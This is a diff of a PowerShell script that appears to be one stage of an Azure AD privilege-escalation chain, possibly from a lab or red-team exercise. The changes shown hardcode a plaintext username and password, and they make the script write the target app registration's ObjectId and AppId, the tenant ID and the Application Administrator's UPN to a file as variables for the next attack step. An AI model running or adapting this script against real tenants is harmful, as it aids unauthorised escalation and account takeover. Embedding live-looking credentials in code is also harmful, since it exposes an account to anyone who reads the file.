@@ -1,7 +1,7 @@
 
 # Step 1.1:  Connect with any Azure AD User and manually grab the Application Administrator
-$username = ""
-$password = ""
+$username = "adriannunez@rtcfingroup.com"
+$password = "endless-stork-EgvN"
 $securepassword = ConvertTo-SecureString "$password" -AsPlainText -Force
 $credential = New-Object System.Management.Automation.PSCredential($username, $securepassword)
 
@@ -86,13 +86,14 @@ if ( $targetappRegistration.count -ge 1 ) {
   $objectid = $targetappRegistration.ObjectId
   $appid = $targetappRegistration.AppId
   Write-Host("This is the ObjectId to target in the next step:  $objectid")
-  Add-Content -Path output.txt -Value "Target ObjectId: $objectid"
+  Add-Content -Path output.txt -Value "`$targetObjectId = `"$objectid`" "
   Write-Host("This is the AppId to target in the next step:  $appid")
-  Add-Content -Path output.txt -Value "Target AppId: $appid"
+  Add-Content -Path output.txt -Value "`$azureApplicationId = `"$appid`" "
+  Add-Content -Path output.txt -Value "`$appadmin_username = `"$upn`" "
   $tenantDetails = Get-AzureADTenantDetail
   $tenantid = $tenantDetails.ObjectId
   Write-Host("This is the TenantId to target in the next step:  $tenantid")
-  Add-Content -Path output.txt -Value "Target TenantId: $tenantid"
+  Add-Content -Path output.txt -Value "`$tenantId = `"$tenantid`" "
 }
 
 # Step 1.4:  Disconnect as this regular Azure AD user
